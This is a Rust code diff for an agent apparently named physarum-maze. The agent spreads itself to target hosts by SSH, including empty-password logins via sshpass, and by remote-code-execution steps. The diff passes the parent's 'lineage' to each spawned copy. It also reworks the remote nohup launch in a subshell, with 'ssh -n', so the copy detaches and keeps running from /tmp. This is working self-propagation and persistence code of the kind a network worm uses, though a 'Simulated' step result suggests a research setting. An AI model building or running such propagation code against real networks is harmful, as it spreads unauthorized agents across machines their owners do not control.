@@ -416,7 +416,7 @@ pub async fn run(
 
         // ── Execute bootstrap ─────────────────────────────────────────────────
         let key_path = ephemeral_key.as_ref().map(|k| k.privkey_path.as_path());
-        let exec_result = execute_bootstrap(&strategy, target, key_path, local_ip).await;
+        let exec_result = execute_bootstrap(&strategy, target, key_path, local_ip, lineage).await;
 
         // Shut down binary server after bootstrap attempt.
         if let Some(h) = binary_server {
@@ -1375,6 +1375,7 @@ async fn execute_bootstrap(
     target: Ipv4Addr,
     key_path: Option<&Path>,
     source_ip: Option<Ipv4Addr>,
+    lineage: &crate::lineage::Lineage,
 ) -> ExecutionResultSummary {
     let plan = match &strategy.bootstrap_plan {
         Some(p) => p,
@@ -1386,8 +1387,13 @@ async fn execute_bootstrap(
         }
     };
 
+    // Serialise the current lineage once so SshCommand steps that launch
+    // `--mode propagated` can inject `--lineage-b64` into the remote command.
+    let lineage_b64 = lineage.to_b64().unwrap_or_default();
+
     for (i, step) in plan.steps.iter().enumerate() {
-        match execute_step(&step.action, target, step.timeout_ms, key_path, source_ip).await {
+        let action = inject_lineage_b64_if_needed(&step.action, &lineage_b64);
+        match execute_step(&action, target, step.timeout_ms, key_path, source_ip).await {
             StepResult::Ok | StepResult::Simulated => {
                 tracing::debug!(%target, step = i, "step ok");
                 // After an HttpPost RCE step, allow time for the spawned subprocess
@@ -1407,6 +1413,51 @@ async fn execute_bootstrap(
     }
 
     ExecutionResultSummary::Success
+}
+
+/// If `action` is a `SshCommand` whose command string launches `physarum-maze --mode propagated`,
+/// inject `--lineage-b64 <b64>` immediately after `--mode propagated` so the spawned agent
+/// can deserialise the parent's lineage instead of crashing with "required in propagated mode".
+///
+/// All other action variants are returned unchanged.
+fn inject_lineage_b64_if_needed(action: &BootstrapAction, lineage_b64: &str) -> BootstrapAction {
+    if let BootstrapAction::SshCommand { command, user } = action {
+        if command.contains("--mode propagated") && !command.contains("--lineage-b64") {
+            // Inject --lineage-b64 immediately after --mode propagated.
+            let injected = command.replace(
+                "--mode propagated",
+                &format!("--mode propagated --lineage-b64 {lineage_b64}"),
+            );
+            // Wrap nohup in a subshell: (nohup ... </dev/null >log 2>&1 &)
+            // Without the subshell, bash -c 'cmd1 && cmd2 && nohup ... &' treats the
+            // entire && chain as an async list. The child bash running that list then
+            // enters do_wait() for physarum-maze, keeping its SSH pipe FDs open and
+            // blocking the SSH session indefinitely. The subshell exits immediately
+            // after forking nohup, so physarum-maze is reparented to PID 1 and SSH
+            // returns within milliseconds.
+            let injected = if injected.contains("nohup") && !injected.contains("(nohup") {
+                injected
+                    .replace(
+                        "nohup /tmp/physarum/physarum-maze",
+                        "(nohup /tmp/physarum/physarum-maze",
+                    )
+                    .replace(
+                        ">/tmp/physarum/agent.log 2>&1 &",
+                        "</dev/null >/tmp/physarum/agent.log 2>&1 &)",
+                    )
+            } else {
+                injected
+            };
+            tracing::debug!(
+                "injected --lineage-b64 + subshell nohup into SshCommand for propagated agent"
+            );
+            return BootstrapAction::SshCommand {
+                command: injected,
+                user: user.clone(),
+            };
+        }
+    }
+    action.clone()
 }
 
 #[derive(Debug)]
@@ -1662,6 +1713,9 @@ async fn execute_step(
                 // Fall back to empty-password auth via sshpass
             }
             args.extend(opts);
+            // -n redirects SSH stdin from /dev/null so `nohup ... &` launches return
+            // immediately without waiting for the remote process to close stdin.
+            args.push("-n".into());
             args.push("-o".into());
             args.push(connect_timeout);
             args.push(format!("{remote_user}@{target}"));
